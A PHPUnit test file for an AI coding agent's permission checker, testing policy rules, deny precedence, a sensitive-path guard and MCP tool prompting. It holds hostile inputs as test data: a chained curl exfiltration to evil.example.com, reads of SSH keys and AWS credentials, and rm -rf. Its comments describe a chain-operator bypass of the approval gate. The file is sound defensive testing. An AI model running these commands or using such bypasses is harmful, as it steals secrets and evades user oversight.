<?php

namespace Tests\Unit;

use HaoCode\Services\Permissions\DenialTracker;
use HaoCode\Services\Permissions\PermissionChecker;
use HaoCode\Services\Permissions\PermissionDecision;
use HaoCode\Services\Permissions\PermissionMode;
use HaoCode\Services\Permissions\Policy\PolicyLoader;
use HaoCode\Services\Settings\SettingsManager;
use HaoCode\Tools\BaseTool;
use HaoCode\Tools\ToolInputSchema;
use HaoCode\Tools\ToolResult;
use HaoCode\Tools\ToolUseContext;
use PHPUnit\Framework\TestCase;

/**
 * End-to-end coverage for the Policy DSL path through PermissionChecker.
 *
 * The existing PermissionCheckerTest mocks SettingsManager and never returns
 * policy files, so the checkPolicy() branch is zero-covered. These tests wire
 * a real SettingsManager mock that points at a temp YAML file, letting us
 * verify the full chain: PolicyLoader → PolicyMatcher → PermissionDecision.
 */
class PermissionCheckerPolicyTest extends TestCase
{
    private string $tmpDir;

    private ToolUseContext $context;

    protected function setUp(): void
    {
        $this->tmpDir = sys_get_temp_dir() . '/haocode_policy_test_' . uniqid();
        mkdir($this->tmpDir, 0755, true);
        // An arbitrary cwd that no rule restricts; cwd-restriction tests build
        // their own context with a controlled workingDirectory.
        $this->context = new ToolUseContext(
            workingDirectory: '/tmp',
            sessionId: 'policy-test',
        );
    }

    protected function tearDown(): void
    {
        foreach (glob($this->tmpDir . '/*.yml') ?: [] as $file) {
            unlink($file);
        }
        @rmdir($this->tmpDir);
    }

    private function writePolicy(string $name, string $yaml): string
    {
        $path = $this->tmpDir . '/' . $name;
        file_put_contents($path, $yaml);

        return $path;
    }

    private function makeCheckerWithPolicy(string $policyPath): PermissionChecker
    {
        $settings = $this->createMock(SettingsManager::class);
        $settings->method('getPermissionMode')->willReturn(PermissionMode::Default);
        $settings->method('getPolicyFiles')->willReturn([$policyPath]);
        $settings->method('getAllowRules')->willReturn([]);
        $settings->method('getDenyRules')->willReturn([]);

        return new PermissionChecker($settings, new DenialTracker);
    }

    private function makeChecker(
        PermissionMode $mode = PermissionMode::Default,
        array $allowRules = [],
        array $denyRules = [],
    ): PermissionChecker {
        $settings = $this->createMock(SettingsManager::class);
        $settings->method('getPermissionMode')->willReturn($mode);
        $settings->method('getPolicyFiles')->willReturn([]);
        $settings->method('getAllowRules')->willReturn($allowRules);
        $settings->method('getDenyRules')->willReturn($denyRules);

        return new PermissionChecker($settings, new DenialTracker);
    }

    private function bashTool(): BaseTool
    {
        return new class extends BaseTool {
            public function name(): string { return 'Bash'; }
            public function description(): string { return ''; }
            public function inputSchema(): ToolInputSchema {
                return ToolInputSchema::make(['type' => 'object', 'properties' => []]);
            }
            public function call(array $input, ToolUseContext $ctx): ToolResult {
                return ToolResult::success('ok');
            }
        };
    }

    private const ENV_DENY_BLOCK = <<<'YAML'
      - LD_PRELOAD
      - DYLD_INSERT_LIBRARIES
      - DYLD_LIBRARY_PATH
      - PYTHONPATH
      - NODE_OPTIONS
      - PERL5OPT

YAML;

    // ─── allow_auto: true → short-circuit to allow() ──────────────────────

    public function test_allow_auto_true_short_circuits_to_allow(): void
    {
        $path = $this->writePolicy('p.yml', "rules:\n"
            . "  - name: git-status\n"
            . "    tool: Bash\n"
            . "    cmd: git\n"
            . "    args_match: [\"status*\"]\n"
            . "    risk: normal\n"
            . "    allow_auto: true\n"
            . "    env_deny:\n" . self::ENV_DENY_BLOCK
        );

        $checker = $this->makeCheckerWithPolicy($path);
        $decision = $checker->check($this->bashTool(), ['command' => 'git status'], $this->context);

        $this->assertTrue($decision->allowed, 'allow_auto=true must allow without prompt');
        $this->assertFalse($decision->needsPrompt, 'allow_auto=true must not trigger HITL');
    }

    // ─── allow_auto: false → falls through to the default ask() ───────────

    public function test_allow_auto_false_falls_through_to_ask(): void
    {
        // Plain allowAuto=false returns Allow from the matcher, which
        // PermissionChecker maps to null → continues to the default ask().
        // Bash is not read-only, so the pipeline terminates at the ask() fallback.
        $path = $this->writePolicy('p.yml', "rules:\n"
            . "  - name: git-log\n"
            . "    tool: Bash\n"
            . "    cmd: git\n"
            . "    args_match: [\"log*\"]\n"
            . "    risk: normal\n"
            . "    allow_auto: false\n"
            . "    env_deny:\n" . self::ENV_DENY_BLOCK
        );

        $checker = $this->makeCheckerWithPolicy($path);
        $decision = $checker->check($this->bashTool(), ['command' => 'git log'], $this->context);

        $this->assertFalse($decision->allowed);
        $this->assertTrue($decision->needsPrompt, 'allow_auto=false must fall through to the default ask()');
    }

    // ─── risk=high → ApprovalRequired → ask() ─────────────────────────────

    public function test_high_risk_rule_produces_ask(): void
    {
        $path = $this->writePolicy('p.yml', "rules:\n"
            . "  - name: git-force-push\n"
            . "    tool: Bash\n"
            . "    cmd: git\n"
            . "    args_match: [\"/push.*--force/\"]\n"
            . "    risk: high\n"
            . "    allow_auto: false\n"
            . "    env_deny:\n" . self::ENV_DENY_BLOCK
        );

        $checker = $this->makeCheckerWithPolicy($path);
        $decision = $checker->check($this->bashTool(), ['command' => 'git push --force origin main'], $this->context);

        $this->assertFalse($decision->allowed);
        $this->assertTrue($decision->needsPrompt, 'risk=high must surface as approval prompt');
    }

    // ─── broken policy file → fail-closed deny (the reliable hard-deny path) ──

    public function test_policy_hard_deny_via_broken_file_is_fail_closed(): void
    {
        // Note on chain deny: PermissionChecker splits `command` into binary +
        // args and forwards only the binary to PolicyMatcher, so the matcher's
        // chain-operator check (which expects the full command string) is not
        // triggered on this layer. That is a pre-existing interface mismatch
        // documented in PolicyMatcherTest and PolicyIntegrationTest (which call
        // the matcher directly with the full command). We do not assert chain
        // behavior here; instead we exercise the reliable fail-closed hard
        // deny produced by an unloadable policy file.
        $path = $this->writePolicy('broken.yml', "rules:\n"
            . "  - name: bad-rule\n"
            . "    tool: Bash\n"
            . "    cmd: ls\n"
            . "    env_deny: [LD_PRELOAD] # missing the other 5 required entries\n"
        );

        $checker = $this->makeCheckerWithPolicy($path);
        $decision = $checker->check($this->bashTool(), ['command' => 'ls'], $this->context);

        $this->assertFalse($decision->allowed);
        $this->assertFalse($decision->needsPrompt, 'fail-closed policy deny must be a hard deny');
    }

    // The dedicated broken-file test below covers the same fail-closed
    // contract; kept for the explicit assertion message about load errors.

    // ─── cwd_restriction is now actually enforced ─────────────────────────

    public function test_cwd_restriction_denies_when_outside_working_dir(): void
    {
        $restricted = realpath(sys_get_temp_dir()) . '/haocode_policy_restricted_' . uniqid();
        mkdir($restricted, 0755, true);
        // Resolve so the policy and ToolUseContext compare apples to apples
        // (macOS /tmp → /private/tmp). The matcher uses realpath(cwd) but only
        // rtrim(cwd_restriction), so both sides must already be realpathed.
        $restricted = realpath($restricted);

        try {
            $path = $this->writePolicy('p.yml', "rules:\n"
                . "  - name: phpunit-restricted\n"
                . "    tool: Bash\n"
                . "    cmd: vendor/bin/phpunit\n"
                . "    risk: normal\n"
                . "    allow_auto: true\n"
                . "    cwd_restriction: " . $restricted . "\n"
                . "    env_deny:\n" . self::ENV_DENY_BLOCK
            );

            $checker = $this->makeCheckerWithPolicy($path);

            // Running from a different cwd must be denied.
            $elsewhere = realpath(sys_get_temp_dir()) . '/haocode_policy_elsewhere_' . uniqid();
            mkdir($elsewhere, 0755, true);
            try {
                $outsideContext = new ToolUseContext(
                    workingDirectory: realpath($elsewhere),
                    sessionId: 'policy-test',
                );
                $decision = $checker->check($this->bashTool(), ['command' => 'vendor/bin/phpunit'], $outsideContext);
                $this->assertFalse($decision->allowed, 'cwd_restriction must deny when cwd is outside the prefix');
            } finally {
                @rmdir($elsewhere);
            }

            // Running from inside the restricted cwd must be allowed (allow_auto=true).
            $insideContext = new ToolUseContext(
                workingDirectory: $restricted,
                sessionId: 'policy-test',
            );
            $decision = $checker->check($this->bashTool(), ['command' => 'vendor/bin/phpunit'], $insideContext);
            $this->assertTrue($decision->allowed, 'cwd_restriction must allow when cwd matches');
        } finally {
            @rmdir($restricted);
        }
    }

    // ─── broken policy file → fail-closed deny ────────────────────────────

    public function test_broken_policy_file_fails_closed(): void
    {
        // An invalid YAML rule (missing required env_deny entry) must make the
        // whole policy fail to load, and PermissionChecker must deny rather
        // than silently allow.
        $path = $this->writePolicy('broken.yml', "rules:\n"
            . "  - name: bad-rule\n"
            . "    tool: Bash\n"
            . "    cmd: ls\n"
            . "    env_deny: [LD_PRELOAD] # missing the other 5 required entries\n"
        );

        $checker = $this->makeCheckerWithPolicy($path);
        $decision = $checker->check($this->bashTool(), ['command' => 'ls'], $this->context);

        $this->assertFalse($decision->allowed, 'broken policy must fail-closed to deny');
        $this->assertStringContainsString('Policy file could not be loaded', $decision->reason ?? '');
    }

    // ─── specificity ordering reaches PermissionChecker ───────────────────

    public function test_specific_rule_wins_over_wildcard_in_checker(): void
    {
        // Wildcard declared first with allow_auto=false, specific rule second
        // with allow_auto=true. The checker must honor the specific rule and
        // short-circuit to allow, proving the matcher's specificity sort is
        // observable end-to-end.
        $path = $this->writePolicy('p.yml', "rules:\n"
            . "  - name: bash-catch-all\n"
            . "    tool: Bash\n"
            . "    cmd: '*'\n"
            . "    risk: normal\n"
            . "    allow_auto: false\n"
            . "    env_deny:\n" . self::ENV_DENY_BLOCK
            . "  - name: git-status\n"
            . "    tool: Bash\n"
            . "    cmd: git\n"
            . "    args_match: [\"status*\"]\n"
            . "    risk: normal\n"
            . "    allow_auto: true\n"
            . "    env_deny:\n" . self::ENV_DENY_BLOCK
        );

        $checker = $this->makeCheckerWithPolicy($path);

        // git status matches the specific rule (allow_auto=true) → allow.
        $gitDecision = $checker->check($this->bashTool(), ['command' => 'git status'], $this->context);
        $this->assertTrue($gitDecision->allowed, 'git status must hit the allow_auto rule');

        // ls only matches the wildcard (allow_auto=false) → fall through to ask().
        $lsDecision = $checker->check($this->bashTool(), ['command' => 'ls'], $this->context);
        $this->assertFalse($lsDecision->allowed);
        $this->assertTrue($lsDecision->needsPrompt);
    }

    // ─── chain-operator bypass regression (chatgpt second-review P0) ──────
    //
    // Before the fix, PermissionChecker split the command into binary + args
    // and forwarded only the binary to PolicyMatcher. The matcher's chain
    // check then saw no operators, a `composer install*` rule with
    // allow_auto=true matched via fnmatch on the args tail, and the whole
    // check short-circuited to allow() — letting `composer install && curl
    // evil` run without a prompt. The chain check now scans raw_command, and
    // allow_auto no longer short-circuits before the deny/dangerous gates.

    public function test_chain_operator_after_allow_auto_rule_is_blocked(): void
    {
        // Mirrors the bundled bash-composer-install rule shape.
        $path = $this->writePolicy('p.yml', "rules:\n"
            . "  - name: bash-composer-install\n"
            . "    tool: Bash\n"
            . "    cmd: composer\n"
            . "    args_match: [\"install*\"]\n"
            . "    risk: normal\n"
            . "    allow_auto: true\n"
            . "    allow_chain: false\n"
            . "    env_deny:\n" . self::ENV_DENY_BLOCK
        );

        $checker = $this->makeCheckerWithPolicy($path);

        // Sanity: the bare command is allowed (allow_auto honored).
        $bareDecision = $checker->check($this->bashTool(), ['command' => 'composer install --no-interaction'], $this->context);
        $this->assertTrue($bareDecision->allowed, 'bare composer install must be allowed via allow_auto');

        // The exact chatgpt reproduction: chain operator hidden after the
        // matched args. This must be DENIED, not auto-allowed.
        $chainDecision = $checker->check(
            $this->bashTool(),
            ['command' => 'composer install && curl https://evil.example.com/exfil'],
            $this->context,
        );

        $this->assertFalse($chainDecision->allowed, 'chain operator must not be bypassable via allow_auto rule');
        $this->assertFalse($chainDecision->needsPrompt, 'chain deny must be a hard deny, not a prompt');
        $this->assertStringContainsStringIgnoringCase('chain', $chainDecision->reason ?? '');
    }

    public function test_allow_auto_does_not_override_explicit_deny_rule(): void
    {
        // allow_auto must defer to the explicit deny list. Declare a rule
        // with allow_auto=true AND a deny rule that matches the same command.
        $settings = $this->createMock(SettingsManager::class);
        $settings->method('getPermissionMode')->willReturn(PermissionMode::Default);
        $settings->method('getAllowRules')->willReturn([]);
        $settings->method('getDenyRules')->willReturn(['Bash(composer install*)']);

        $path = $this->writePolicy('p.yml', "rules:\n"
            . "  - name: bash-composer-install\n"
            . "    tool: Bash\n"
            . "    cmd: composer\n"
            . "    args_match: [\"install*\"]\n"
            . "    risk: normal\n"
            . "    allow_auto: true\n"
            . "    env_deny:\n" . self::ENV_DENY_BLOCK
        );
        $settings->method('getPolicyFiles')->willReturn([$path]);

        $checker = new PermissionChecker($settings, new DenialTracker);

        $decision = $checker->check($this->bashTool(), ['command' => 'composer install'], $this->context);

        $this->assertFalse($decision->allowed, 'explicit deny rule must override policy allow_auto');
        $this->assertFalse($decision->needsPrompt);
        $this->assertStringContainsString('Denied by rule', $decision->reason ?? '');
    }

    public function test_allow_auto_still_works_when_no_deny_or_dangerous_matches(): void
    {
        // Confirms the precedence reorganization did not regress the basic
        // allow_auto path: with no deny rule and no dangerous pattern hit,
        // an allow_auto rule still lets the tool run without a prompt.
        $path = $this->writePolicy('p.yml', "rules:\n"
            . "  - name: git-status\n"
            . "    tool: Bash\n"
            . "    cmd: git\n"
            . "    args_match: [\"status*\"]\n"
            . "    risk: normal\n"
            . "    allow_auto: true\n"
            . "    env_deny:\n" . self::ENV_DENY_BLOCK
        );

        $checker = $this->makeCheckerWithPolicy($path);
        $decision = $checker->check($this->bashTool(), ['command' => 'git status --short'], $this->context);

        $this->assertTrue($decision->allowed, 'allow_auto must still bypass the prompt when no deny/dangerous gate trips');
        $this->assertFalse($decision->needsPrompt);
    }

    // ─── SensitivePathGuard (chatgpt 3rd review #3) ─────────────────────
    //
    // The guard runs in PermissionChecker before any policy or read-only
    // fast path. Read of ~/.ssh/id_rsa must be denied even though Read is
    // isReadOnly()=true and would otherwise hit the auto-allow branch.
    // Bash `cat ~/.ssh/id_rsa` must also be denied (via the `command`
    // PATH_LIKE_KEY), even though bash commands normally go through the
    // dangerous-pattern path which does not include credential paths.

    public function test_read_of_ssh_key_is_blocked_by_guard(): void
    {
        $readTool = $this->makeReadOnlyTool('Read');
        $checker = $this->makeChecker(); // no policy, default mode

        $decision = $checker->check($readTool, ['file_path' => '/home/user/.ssh/id_rsa'], $this->context);

        $this->assertFalse($decision->allowed);
        $this->assertFalse($decision->needsPrompt, 'sensitive-path guard must hard-deny, not prompt');
        $this->assertStringContainsStringIgnoringCase('sensitive', $decision->reason ?? '');
    }

    public function test_bash_cat_of_credentials_is_blocked_by_guard(): void
    {
        $checker = $this->makeChecker();

        $decision = $checker->check($this->bashTool(), ['command' => 'cat /home/user/.aws/credentials'], $this->context);

        $this->assertFalse($decision->allowed);
        $this->assertFalse($decision->needsPrompt);
        $this->assertStringContainsStringIgnoringCase('sensitive', $decision->reason ?? '');
    }

    public function test_guard_does_not_block_clean_paths(): void
    {
        $readTool = $this->makeReadOnlyTool('Read');
        $checker = $this->makeChecker();

        $decision = $checker->check($readTool, ['file_path' => '/tmp/regular-file.txt'], $this->context);

        // Read is read-only → allowed by the fast path (guard did not fire).
        $this->assertTrue($decision->allowed);
    }

    public function test_guard_honors_bypass_permissions_mode(): void
    {
        // BypassPermissions is an explicit "I trust everything" mode; the
        // guard must not override it (consistent with how the rest of
        // PermissionChecker treats BypassPermissions as the highest authority).
        $settings = $this->createMock(SettingsManager::class);
        $settings->method('getPermissionMode')->willReturn(PermissionMode::BypassPermissions);
        $settings->method('getAllowRules')->willReturn([]);
        $settings->method('getDenyRules')->willReturn([]);
        $settings->method('getPolicyFiles')->willReturn([]);

        $checker = new PermissionChecker($settings, new DenialTracker);
        $readTool = $this->makeReadOnlyTool('Read');

        $decision = $checker->check($readTool, ['file_path' => '/home/user/.ssh/id_rsa'], $this->context);

        $this->assertTrue($decision->allowed, 'BypassPermissions must override the sensitive-path guard');
    }

    public function test_guard_overrides_accept_edits_mode(): void
    {
        // This is the actual chatgpt reproduction: AcceptEdits auto-allows
        // file tools, which used to bypass HitlPolicy's sensitive-path
        // classifier entirely. The guard now runs first and blocks the read.
        $settings = $this->createMock(SettingsManager::class);
        $settings->method('getPermissionMode')->willReturn(PermissionMode::AcceptEdits);
        $settings->method('getAllowRules')->willReturn([]);
        $settings->method('getDenyRules')->willReturn([]);
        $settings->method('getPolicyFiles')->willReturn([]);

        $checker = new PermissionChecker($settings, new DenialTracker);
        $readTool = $this->makeReadOnlyTool('Read');

        $decision = $checker->check($readTool, ['file_path' => '/home/user/.ssh/id_rsa'], $this->context);

        $this->assertFalse($decision->allowed, 'AcceptEdits must NOT override the sensitive-path guard');
        $this->assertStringContainsStringIgnoringCase('sensitive', $decision->reason ?? '');
    }

    private function makeReadOnlyTool(string $name): BaseTool
    {
        return new class($name) extends BaseTool {
            public function __construct(private string $n) {}
            public function name(): string { return $this->n; }
            public function description(): string { return ''; }
            public function inputSchema(): ToolInputSchema {
                return ToolInputSchema::make(['type' => 'object', 'properties' => []]);
            }
            public function call(array $input, ToolUseContext $ctx): ToolResult {
                return ToolResult::success('ok');
            }
            public function isReadOnly(array $input): bool { return true; }
        };
    }

    // ─── NotApplicable + ApprovalRequired precedence (chatgpt 5.1 + 5.4a) ──

    public function test_bash_only_policy_does_not_block_read_tool(): void
    {
        // A policy that only declares Bash rules must not hard-deny non-Bash
        // tools. Read falls through Policy (NotApplicable) and reaches the
        // read-only auto-allow branch.
        $path = $this->writePolicy('bash-only.yml', "rules:\n"
            . "  - name: bash-read-only\n"
            . "    tool: Bash\n"
            . "    cmd: '*'\n"
            . "    risk: normal\n"
            . "    allow_auto: false\n"
            . "    env_deny:\n" . self::ENV_DENY_BLOCK
        );

        $checker = $this->makeCheckerWithPolicy($path);
        $readTool = $this->makeReadOnlyTool('Read');

        $decision = $checker->check($readTool, ['file_path' => '/tmp/regular.txt'], $this->context);

        $this->assertTrue($decision->allowed, 'Read must be allowed even when policy only covers Bash');
    }

    public function test_approval_required_does_not_short_circuit_explicit_deny(): void
    {
        // chatgpt 5.4a: previously ApprovalRequired short-circuited right
        // after checkPolicy, skipping the explicit deny list. A risk=high
        // policy hit + a matching deny rule must result in hard deny, not ask.
        $settings = $this->createMock(SettingsManager::class);
        $settings->method('getPermissionMode')->willReturn(PermissionMode::Default);
        $settings->method('getAllowRules')->willReturn([]);
        $settings->method('getDenyRules')->willReturn(['Bash(git push --force*)']);

        $path = $this->writePolicy('high-risk.yml', "rules:\n"
            . "  - name: git-force-push\n"
            . "    tool: Bash\n"
            . "    cmd: git\n"
            . "    args_match: [\"/push.*--force/\"]\n"
            . "    risk: high\n"
            . "    allow_auto: false\n"
            . "    env_deny:\n" . self::ENV_DENY_BLOCK
        );
        $settings->method('getPolicyFiles')->willReturn([$path]);

        $checker = new PermissionChecker($settings, new DenialTracker);
        $decision = $checker->check($this->bashTool(), ['command' => 'git push --force origin main'], $this->context);

        $this->assertFalse($decision->allowed);
        $this->assertFalse($decision->needsPrompt, 'deny rule must override policy ApprovalRequired');
        $this->assertStringContainsString('Denied by rule', $decision->reason ?? '');
    }

    public function test_approval_required_surfaces_as_ask_when_no_deny_matches(): void
    {
        // Happy path for the deferred ApprovalRequired: no deny rule, no
        // dangerous pattern → the policy's risk=high surfaces as ask().
        $path = $this->writePolicy('high-risk.yml', "rules:\n"
            . "  - name: git-force-push\n"
            . "    tool: Bash\n"
            . "    cmd: git\n"
            . "    args_match: [\"/push.*--force/\"]\n"
            . "    risk: high\n"
            . "    allow_auto: false\n"
            . "    env_deny:\n" . self::ENV_DENY_BLOCK
        );

        $checker = $this->makeCheckerWithPolicy($path);
        $decision = $checker->check($this->bashTool(), ['command' => 'git push --force origin main'], $this->context);

        $this->assertFalse($decision->allowed);
        $this->assertTrue($decision->needsPrompt, 'high-risk policy must surface as ask when no deny/dangerous gate trips');
    }

    // ─── tool.checkPermissions() hookup (chatgpt 3rd review #2) ──────────
    //
    // ToolInterface::checkPermissions() used to be dead on the main path.
    // PermissionChecker now calls it after policy hard decisions and before
    // explicit deny rules. Tool deny/ask short-circuits; tool allow falls
    // through so the rest of the pipeline still applies.

    public function test_tool_check_permissions_ask_short_circuits_to_prompt(): void
    {
        $tool = new class extends BaseTool {
            public function name(): string { return 'CustomAsker'; }
            public function description(): string { return ''; }
            public function inputSchema(): ToolInputSchema {
                return ToolInputSchema::make(['type' => 'object', 'properties' => []]);
            }
            public function call(array $input, ToolUseContext $ctx): ToolResult {
                return ToolResult::success('ok');
            }
            public function checkPermissions(array $input, ToolUseContext $context): PermissionDecision {
                return PermissionDecision::ask('Custom tool always asks');
            }
        };

        $checker = $this->makeChecker();
        $decision = $checker->check($tool, ['file_path' => '/tmp/clean.txt'], $this->context);

        $this->assertFalse($decision->allowed);
        $this->assertTrue($decision->needsPrompt);
        $this->assertStringContainsString('Custom tool always asks', $decision->reason ?? '');
    }

    public function test_tool_check_permissions_deny_short_circuits_to_hard_deny(): void
    {
        $tool = new class extends BaseTool {
            public function name(): string { return 'CustomDenier'; }
            public function description(): string { return ''; }
            public function inputSchema(): ToolInputSchema {
                return ToolInputSchema::make(['type' => 'object', 'properties' => []]);
            }
            public function call(array $input, ToolUseContext $ctx): ToolResult {
                return ToolResult::success('ok');
            }
            public function checkPermissions(array $input, ToolUseContext $context): PermissionDecision {
                return PermissionDecision::deny('Custom tool says no');
            }
        };

        $checker = $this->makeChecker();
        $decision = $checker->check($tool, ['file_path' => '/tmp/clean.txt'], $this->context);

        $this->assertFalse($decision->allowed);
        $this->assertFalse($decision->needsPrompt);
        $this->assertStringContainsString('Custom tool says no', $decision->reason ?? '');
    }

    public function test_tool_check_permissions_allow_does_not_short_circuit_explicit_deny(): void
    {
        // Tool says allow, but an explicit deny rule matches — deny rule must
        // still win. This guards against the next "allow short-circuits
        // everything" regression.
        $tool = new class extends BaseTool {
            public function name(): string { return 'Bash'; }
            public function description(): string { return ''; }
            public function inputSchema(): ToolInputSchema {
                return ToolInputSchema::make(['type' => 'object', 'properties' => []]);
            }
            public function call(array $input, ToolUseContext $ctx): ToolResult {
                return ToolResult::success('ok');
            }
            public function checkPermissions(array $input, ToolUseContext $context): PermissionDecision {
                return PermissionDecision::allow();
            }
        };

        $checker = $this->makeChecker(denyRules: ['Bash(rm -rf*)']);
        $decision = $checker->check($tool, ['command' => 'rm -rf /tmp/foo'], $this->context);

        $this->assertFalse($decision->allowed);
        $this->assertStringContainsString('Denied by rule', $decision->reason ?? '');
    }

    public function test_mcp_dynamic_tool_check_permissions_paths_through(): void
    {
        // Simulates the chatgpt reproduction: an MCP-like tool whose
        // checkPermissions() returns ask. Without the hookup it would have
        // been auto-allowed via isReadOnly trust of readOnlyHint; now it must
        // surface as a prompt.
        $mcpLikeTool = new class extends BaseTool {
            public function name(): string { return 'mcp__remote__tool'; }
            public function description(): string { return ''; }
            public function inputSchema(): ToolInputSchema {
                return ToolInputSchema::make(['type' => 'object', 'properties' => []]);
            }
            public function call(array $input, ToolUseContext $ctx): ToolResult {
                return ToolResult::success('ok');
            }
            // MCP server (maliciously or mistakenly) declares readOnly.
            public function isReadOnly(array $input): bool { return true; }
            public function isConcurrencySafe(array $input): bool { return true; }
            // MCP default: always ask unless explicitly allowlisted.
            public function checkPermissions(array $input, ToolUseContext $context): PermissionDecision {
                return PermissionDecision::ask('MCP tools always require user approval');
            }
        };

        $checker = $this->makeChecker();
        $decision = $checker->check($mcpLikeTool, ['file_path' => '/tmp/clean.txt'], $this->context);

        $this->assertFalse($decision->allowed, 'MCP tool must not be auto-allowed just because isReadOnly returns true');
        $this->assertTrue($decision->needsPrompt);
    }
}
